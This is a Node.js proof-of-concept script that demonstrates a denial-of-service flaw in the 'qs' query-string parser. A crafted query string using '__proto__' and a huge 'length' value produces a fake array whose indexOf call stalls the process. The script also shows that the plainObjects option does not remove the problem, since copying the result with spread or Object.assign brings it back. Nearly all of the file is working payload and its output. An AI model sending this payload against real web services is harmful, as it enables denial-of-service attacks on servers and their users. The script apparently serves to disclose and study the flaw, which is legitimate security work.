const qs = require("qs");
{
	
	// using the default express configuration :
	console.log('Using the default express configuration : \n');
	console.log('qs.parse("categories[__proto__]=login&categories[__proto__]&categories[length]=100000000", { allowPrototypes: true })');
	
	let query     = qs.parse("categories[__proto__]=login&categories[__proto__]&categories[length]=100000000", { allowPrototypes: true }),
	    arrayBomb = query.categories;
	
	console.log('arrayBomb value : ', arrayBomb);
	/*
	 arrayBomb === Array { length: '100000000' }
	 
	 internal structure :
	 {
	 length    : '100000000',
	 __proto__ : ['login', '']
	 }
	 */
	
	console.log('(arrayBomb instanceof Array) : ', (arrayBomb instanceof Array)); // true
	console.log("Do arrayBomb.indexOf(\"123\")...");
	arrayBomb.indexOf("123")// this will take ~5s
	console.log("\n\n_________________________\n\n");
}
{
	/**
	 * plainObjects option make qs use object without prototype to write values
	 * as result, the keys are wrote on the object itself so the "__proto__" key is not interpreted
	 */
	// using the plainObject option :
	console.log('Using the plainObjects configuration option : \n');
	console.log('qs.parse("categories[__proto__]=login&categories[__proto__]&categories[length]=100000000", { plainObjects: true })');
	
	let query     = qs.parse("categories[__proto__]=login&categories[__proto__]&categories[length]=100000000", { plainObjects: true }),
	    arrayTimeBomb = query.categories;
	console.log('arrayTimeBomb value : ', arrayTimeBomb);
	/*
	 [Object: null prototype] {
	 ['__proto__']: [ 'login', '' ],
	 length: '100000000'
	 }
	 */
	
	console.log('(arrayTimeBomb instanceof Array) : ', (arrayTimeBomb instanceof Array));
	
	// When using babel :
	// '...' will be done using "Object.assign"
	console.log('Do arrayTimeBomb = { ...arrayTimeBomb }');
	arrayTimeBomb = { ...arrayTimeBomb };
	
	console.log('arrayTimeBomb value : ', arrayTimeBomb);
	// { ['__proto__']: [ 'login', '' ], length: '100000000' }
	
	// using Object.assign or any classic loop :
	console.log('Do arrayTimeBomb = Object.assign({}, arrayTimeBomb)');
	arrayTimeBomb = Object.assign({}, arrayTimeBomb);
	console.log('arrayBomb value : ', arrayTimeBomb);
	/*
	 arrayTimeBomb === Array { length: '100000000' }
	 
	 internal structure :
	 {
	 length    : '100000000',
	 __proto__ : ['login', '']
	 }
	 */
	
	console.log('(arrayTimeBomb instanceof Array) : ', (arrayTimeBomb instanceof Array));
	console.log("Do arrayTimeBomb.indexOf(\"123\")...");
	console.time("arrayTimeBomb.indexOf(\"123\")");
	arrayTimeBomb.indexOf("123")
	console.timeEnd("arrayTimeBomb.indexOf(\"123\")");
	console.log("\n\n_________________________\n\n");
}
